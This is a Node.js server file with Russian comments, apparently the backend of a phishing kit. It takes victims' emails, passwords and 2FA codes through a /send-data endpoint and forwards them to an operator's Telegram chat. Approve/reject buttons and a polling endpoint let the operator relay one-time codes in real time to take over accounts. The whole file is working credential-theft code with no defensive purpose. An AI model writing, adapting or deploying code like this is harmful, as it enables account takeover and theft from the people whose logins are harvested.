const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

const token = 'ТВОЙ_НОВЫЙ_ТОКЕН'; // Замени на новый!
const adminChatId = '-1003894478662';

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

let userStatuses = {};

// Логирование ошибок бота в консоль Render
bot.on('polling_error', (err) => console.log('Ошибка бота:', err.message));

app.post('/send-data', (req, res) => {
    const { type, email, pass, code, userId } = req.body;
    userStatuses[userId] = 'pending';
    
    let message = type === 'auth' 
        ? `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\`` 
        : `🔢 **Код 2FA**: \`${code}\``;

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Ок', callback_data: `ok_${userId}` },
                { text: '❌ Ошибка', callback_data: `err_${userId}` }
            ]]
        }
    }).catch(e => console.error('Ошибка отправки:', e));

    res.json({ status: 'ok' });
});

bot.on('callback_query', (query) => {
    const [action, userId] = query.data.split('_');
    userStatuses[userId] = action === 'ok' ? 'success' : 'error';

    bot.answerCallbackQuery(query.id, { text: "Готово" });
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id
    });
});

app.get('/check/:userId', (req, res) => {
    res.json({ status: userStatuses[req.params.userId] || 'none' });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
